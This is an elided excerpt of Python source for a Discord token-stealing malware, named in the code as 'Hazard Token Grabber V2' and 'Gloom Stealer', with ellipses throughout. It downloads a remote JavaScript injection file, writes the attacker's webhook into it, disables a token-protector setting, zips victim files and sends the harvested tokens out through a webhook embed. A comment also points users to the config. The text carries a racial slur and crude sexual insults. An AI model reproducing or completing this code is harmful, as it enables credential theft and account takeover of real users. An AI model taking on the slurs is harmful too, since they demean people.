...
#SCROLL A BIT DOWN FOR THE CONFIG (LINE 88) 😘
...
class Hazard_Token_Grabber_V2(functions):
                        ...
                        if os.path.exists(inj_path):
                            if self.startup_loc not in argv[0]:
                                try:
                                    ...
                                    pass
                            f = httpx.get('https://raw.githubusercontent.com/addi00000/empyrean-injection/main/clean.js').text.replace("%WEBHOOK%", self.webhook)
                            try:
        ...
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    ...
                    return
                item['penis just raped your token-protector shit LMAOOOO'] = "penis"
    ...
    def finish(self):
        ...
        _zipfile = os.path.join(
            self.appdata, f'Gloom-Stealer-[{Victim}].zip')
        ...
        for tkn in self.tokens:
            tokens += f'{tkn}\n\n'
        fileCount = f"{len(files)} files spotted!: "
        embed = {
            'username'
            ...
            'embeds': [
                {
                    'author': {
                        'name': f'this nigga {Victim} commited Gloom stealer.',
                        'url': 'https://dsc.gg/mercurywtf',
...
def uploadToken(token, path):
    ...
    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/991096084774412289/1048980793134944266/Untitled3_20221203213929.png"
    else:
